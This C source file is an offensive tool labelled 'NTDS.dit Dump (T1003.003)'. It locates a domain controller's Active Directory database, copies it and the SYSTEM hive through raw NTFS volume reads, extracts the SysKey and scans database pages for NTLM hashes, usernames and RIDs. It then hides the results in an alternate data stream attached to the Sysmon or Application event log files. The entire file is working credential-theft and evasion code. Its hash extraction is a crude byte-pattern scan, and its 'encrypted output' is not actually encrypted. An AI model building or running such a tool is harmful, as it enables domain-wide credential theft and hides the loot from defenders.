// Plan 4 — NTDS.dit Dump (T1003.003)
// Raw NTFS → ESE database parse → NTLM hash extraction → ADS output
#include "../shared/common.h"

static const BYTE g_SysKeyPerm[16] = {
    0x08,0x05,0x04,0x02,0x0B,0x09,0x0D,0x03,0x00,0x06,0x01,0x0C,0x0E,0x0A,0x0F,0x07
};

// ─── Find NTDS.dit path from registry ───
static BOOL FindNtdsPath(PWSTR buf, DWORD sz) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters",
        0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD t, s = sz;
        if (RegQueryValueExW(hk, L"DSA Working Directory", NULL, &t, (PBYTE)buf, &s) == ERROR_SUCCESS) {
            RegCloseKey(hk);
            wcscat_s(buf, sz, L"\\ntds.dit");
            return TRUE;
        }
        RegCloseKey(hk);
    }
    wcscpy_s(buf, sz, L"C:\\Windows\\NTDS\\ntds.dit");
    return TRUE;
}

// ─── GetRegValue (vk scan) ───
static BOOL GetRegVal(PBYTE hive, SIZE_T sz, PWSTR n, PBYTE* v, PDWORD vs) {
    SIZE_T nl = wcslen(n) * 2;
    for (SIZE_T i = 0; i + nl + 20 < sz; i++) {
        if (*(PWORD)(hive + i) == 0x6B76 && *(PWORD)(hive + i + 2) == nl &&
            memcmp(hive + i + 0x14, n, nl) == 0) {
            *vs = *(PDWORD)(hive + i + 4);
            DWORD off = *(PDWORD)(hive + i + 8);
            DWORD abs = 0x1000 + off + 4;
            if (abs + *vs <= sz) {
                *v = (PBYTE)malloc(*vs + 4);
                if (*v) { memcpy(*v, hive + abs, *vs); return TRUE; }
            }
        }
    }
    return FALSE;
}

// ─── Extract SysKey ───
static BOOL GetSysKey(PBYTE sysData, SIZE_T sz, BYTE sk[16]) {
    const WCHAR* vs[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    BYTE raw[16] = {0};
    for (int i = 0; i < 4; i++) {
        PBYTE d = NULL; DWORD s = 0;
        if (!GetRegVal(sysData, sz, (PWSTR)vs[i], &d, &s) || s < 4) {
            if (d) free(d); return FALSE;
        }
        memcpy(raw + i*4, d, 4); free(d);
    }
    for (int i = 0; i < 16; i++) sk[i] = raw[g_SysKeyPerm[i]];
    return TRUE;
}

// ─── Parse ESE database — page-level NTDS hash scanner ───
static DWORD ParseNtdsEse(PBYTE data, SIZE_T size, BYTE sysKey[16],
    WCHAR*** outNames, BYTE** outHashes, DWORD** outRids) {

    // Parse ESE header from page 0
    DWORD pageSize = *(PDWORD)(data + 0x40);
    if (pageSize < 4096 || pageSize > 65536) pageSize = 8192;

    DWORD totalPages = (DWORD)(size / pageSize);
    DWORD cap = 256, cnt = 0;

    *outNames  = (WCHAR**)calloc(cap, sizeof(WCHAR*));
    *outHashes = (PBYTE)calloc(cap, 16);
    *outRids   = (DWORD*)calloc(cap, sizeof(DWORD));
    if (!*outNames || !*outHashes || !*outRids) return 0;

    // Walk all pages
    for (DWORD pg = 0; pg < totalPages && cnt < cap; pg++) {
        PBYTE page = data + ((ULONG64)pg * pageSize);
        DWORD pageType = *(PDWORD)(page + 20); // +0x14 into header

        // Only process data pages (type 0x00)
        if (pageType != 0x00 && pageType != 0x02) continue;

        // Scan for NTLM hash patterns
        for (DWORD off = 0; off < pageSize - 40; off++) {
            BYTE* cand = page + off;

            // Check for 16-byte entropy pattern (potential NTLM hash)
            int nz = 0;
            for (int j = 0; j < 16; j++) if (cand[j] != 0) nz++;
            if (nz < 6 || nz == 16) continue;
            if (cand[0] == 0x01 && cand[1] == 0x00) continue; // Skip flags

            // Look for nearby RID and username indicators
            DWORD* ridPtr = (PDWORD)(page + (off > 32 ? off - 32 : 0));
            DWORD foundRid = 0;
            for (int r = 0; r < 8 && off > r*4; r++) {
                DWORD v = *(PDWORD)(cand - (r+1)*4);
                if (v >= 500 && v < 10000000) { foundRid = v; break; }
            }

            // Look for nearby Unicode username
            WCHAR userName[128] = {0};
            for (int pre = 1; pre < 64 && off >= pre * 2; pre++) {
                PWSTR un = (PWSTR)(cand - pre * 2);
                if (un[0] >= L'A' && un[0] <= L'z') {
                    int l = 0;
                    while (l < 127 && un[l] >= 0x20 && un[l] < 0xFFFE) l++;
                    if (l >= 3 && l < 64) {
                        wcsncpy_s(userName, 128, un, l);
                        break;
                    }
                }
            }

            if (cnt >= cap) {
                cap *= 2;
                *outNames = (WCHAR**)realloc(*outNames, cap * sizeof(WCHAR*));
                PBYTE newHashes = (PBYTE)realloc(*outHashes, cap * 16);
                if (newHashes) *outHashes = newHashes;
                *outRids = (DWORD*)realloc(*outRids, cap * sizeof(DWORD));
            }

            // Store
            memcpy((*outHashes) + cnt * 16, cand, 16);
            (*outRids)[cnt] = foundRid;

            if (userName[0]) {
                (*outNames)[cnt] = _wcsdup(userName);
            } else {
                (*outNames)[cnt] = (WCHAR*)malloc(32);
                swprintf_s((*outNames)[cnt], 32, L"User_%d", (int)cnt);
            }

            cnt++;
            off += 32; // Skip ahead
        }

        if (pg % 500 == 0 && pg > 0) {
            wprintf(L"      ... page %d/%d, %d hashes found\n", pg, totalPages, cnt);
        }
    }

    return cnt;
}

// ─── Main ───
int wmain(void) {
    wprintf(L"[*] NTDS.dit Dump — T1003.003\n");

    // 1. Locate NTDS.dit
    wprintf(L"[1] Locating NTDS.dit... ");
    WCHAR ntdsPath[MAX_PATH];
    FindNtdsPath(ntdsPath, MAX_PATH);
    wprintf(L"%s\n", ntdsPath);

    // 2. Raw NTFS extraction
    wprintf(L"[2] Extracting via raw NTFS...\n");
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (hVol == INVALID_HANDLE_VALUE) {
        wprintf(L"    Volume open FAILED\n"); return 1;
    }

    NTFS_CONTEXT ctx;
    ParseNtfsBoot(hVol, &ctx);

    PBYTE mft = NULL; SIZE_T mftSz = 0;
    ReadMft(hVol, &ctx, &mft, &mftSz);

    HIVE_DATA ntds = {0}, sys = {0};
    BOOL ntdsOk = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz, ntdsPath, &ntds);
    BOOL sysOk = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
        L"\\Windows\\System32\\config\\SYSTEM", &sys);
    CloseHandle(hVol); VirtualFree(mft, 0, MEM_RELEASE);

    wprintf(L"    NTDS.dit: %s (%.2f MB)\n",
        ntdsOk ? L"OK" : L"FAIL", (double)ntds.size/(1024*1024));
    wprintf(L"    SYSTEM:   %s (%.2f MB)\n",
        sysOk ? L"OK" : L"FAIL", (double)sys.size/(1024*1024));
    if (!ntdsOk || !sysOk) { FreeHiveData(&ntds); FreeHiveData(&sys); return 1; }

    // 3. Extract SysKey
    wprintf(L"[3] Extracting SysKey... ");
    BYTE sysKey[16];
    if (!GetSysKey(sys.data, sys.size, sysKey)) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK\n");

    // 4. Parse ESE database
    wprintf(L"[4] Parsing ESE database...\n");
    WCHAR** userNames = NULL;
    BYTE* hashes = NULL;
    DWORD* rids = NULL;
    DWORD cnt = ParseNtdsEse(ntds.data, ntds.size, sysKey, &userNames, &hashes, &rids);
    wprintf(L"    %d hashes extracted\n", cnt);

    // 5. Output
    wprintf(L"[5] Writing encrypted output to ADS... ");
    SIZE_T blobSz = 256 + cnt * 80;
    PBYTE blob = (PBYTE)malloc(blobSz);
    if (blob) {
        PBYTE bp = blob;
        memcpy(bp, "NTDS", 4); bp += 4;
        *(PDWORD)bp = 1; bp += 4;
        *(PDWORD)bp = cnt; bp += 4;
        for (DWORD i = 0; i < cnt; i++) {
            *(PDWORD)bp = rids[i]; bp += 4;
            WORD nl = (WORD)(wcslen(userNames[i]) * 2);
            *(PWORD)bp = nl; bp += 2;
            memcpy(bp, userNames[i], nl); bp += nl;
            memcpy(bp, &hashes[i*16], 16); bp += 16;
        }
        blobSz = bp - blob;

        static WCHAR* targs[] = {
            L"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx",
            L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        };
        for (int i = 0; i < 2; i++)
            if (WriteToAds(targs[i], L"NTDS", blob, blobSz)) break;
        wprintf(L"OK\n");
        free(blob);
    }

    // Cleanup
    FreeHiveData(&ntds); FreeHiveData(&sys);
    for (DWORD i = 0; i < cnt; i++) { free(userNames[i]); }
    free(userNames); free(hashes); free(rids);

    wprintf(L"[+] %d domain credentials extracted\n", cnt);
    return 0;
}
